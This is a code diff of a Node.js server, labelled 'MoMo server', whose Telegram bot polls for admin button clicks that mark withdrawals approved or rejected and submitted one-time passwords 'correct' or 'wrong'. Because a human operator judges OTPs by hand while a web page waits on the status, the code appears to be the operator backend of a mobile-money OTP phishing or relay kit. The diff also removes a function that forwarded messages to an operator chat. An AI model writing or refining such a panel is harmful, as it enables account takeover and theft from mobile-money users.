@@ -90,16 +90,12 @@ app.post('/api/verify-otp', async (req, res) => {
 app.get('/api/check-otp-status', (req, res) => {
     res.json({ status: otpStatus });
 });
-
-// 5. Telegram Long-Polling with Safe Property Validation and Continuous Loop
+// 5. Telegram Long Polling to listen for Admin button clicks
 async function pollTelegramUpdates() {
-    if (!process.env.BOT_TOKEN) {
-        setTimeout(pollTelegramUpdates, 5000);
-        return;
-    }
+    if (!BOT_TOKEN) return;
 
     try {
-        const response = await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
         const data = await response.json();
 
         if (data.ok && data.result && data.result.length > 0) {
@@ -107,80 +103,60 @@ async function pollTelegramUpdates() {
                 lastUpdateId = update.update_id;
 
                 if (update.callback_query) {
-                    const callbackQuery = update.callback_query;
-                    const action = callbackQuery.data;
-                    const callbackQueryId = callbackQuery.id;
-                    
-                    const chatId = callbackQuery.message && callbackQuery.message.chat ? callbackQuery.message.chat.id : null;
-                    const messageId = callbackQuery.message ? callbackQuery.message.message_id : null;
+                    const action = update.callback_query.data;
+                    const chatId = update.callback_query.message.chat.id;
+                    const messageId = update.callback_query.message.message_id;
+                    const callbackQueryId = update.callback_query.id;
 
                     await answerCallback(callbackQueryId, 'Processing action...');
 
-                    if (chatId && messageId) {
-                        await removeMessageButtons(chatId, messageId);
-                    }
+                    // 1. Remove buttons from original message so it can't be clicked twice, leaving details fully visible
+                    await removeMessageButtons(chatId, messageId);
 
+                    // 2. Send status confirmation right underneath
                     let statusMessage = '';
                     if (action === 'approve_withdrawal') {
                         withdrawalStatus = 'approved';
-                        statusMessage = '✅ Status: Withdrawal Approved by Admin';
+                        statusMessage = '✅ *Status: Withdrawal Approved by Admin*';
                     } else if (action === 'reject_withdrawal') {
                         withdrawalStatus = 'rejected';
-                        statusMessage = '❌ Status: Withdrawal Declined by Admin';
+                        statusMessage = '❌ *Status: Withdrawal Declined by Admin*';
                     } else if (action === 'correct_otp') {
                         otpStatus = 'success';
-                        statusMessage = '✅ Status: OTP Verified - Success';
+                        statusMessage = '✅ *Status: OTP Verified - Success*';
                     } else if (action === 'wrong_otp') {
                         otpStatus = 'wrong';
-                        statusMessage = '✅ Status: Wrong OTP - Retrying';
+                        statusMessage = '❌ *Status: Wrong OTP - Retrying*';
                     }
 
-                    if (statusMessage && chatId) {
+                    if (statusMessage) {
                         await sendStatusMessage(chatId, statusMessage);
                     }
                 }
             }
         }
     } catch (err) {
-        console.error('Polling error caught safely:', err.message);
+        console.error('Polling error:', err.message);
     }
 
-    // Ensures continuous loop without breaking on failure
     setTimeout(pollTelegramUpdates, 1000);
 }
 
-// Telegram Helper Functions
 async function answerCallback(callbackQueryId, text) {
     try {
-        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/answerCallbackQuery`, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ callback_query_id: callbackQueryId, text })
         });
     } catch (e) {
-        console.error('Answer callback error:', e.message);
-    }
-}
-
-async function sendTelegramMessage(text, keyboard) {
-    try {
-        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: process.env.CHAT_ID,
-                text: text,
-                reply_markup: { inline_keyboard: keyboard }
-            })
-        });
-    } catch (e) {
-        console.error('Send telegram message error:', e.message);
+        console.error('Answer callback error:', e);
     }
 }
 
 async function removeMessageButtons(chatId, messageId) {
     try {
-        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/editMessageReplyMarkup`, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
@@ -190,28 +166,28 @@ async function removeMessageButtons(chatId, messageId) {
             })
         });
     } catch (e) {
-        console.error('Remove buttons error:', e.message);
+        console.error('Remove buttons error:', e);
     }
 }
 
 async function sendStatusMessage(chatId, text) {
     try {
-        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: chatId, 
-                text: text 
+                text: text, 
+                parse_mode: 'Markdown' 
             })
         });
     } catch (e) {
-        console.error('Send status message error:', e.message);
+        console.error('Send status message error:', e);
     }
 }
 
-// Start Server using Render's dynamic port assignment
-const PORT = process.env.PORT || 10000;
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`MoMo server running successfully on port ${PORT}`);
+    console.log(`Server running successfully on port ${PORT}`);
     pollTelegramUpdates();
 });
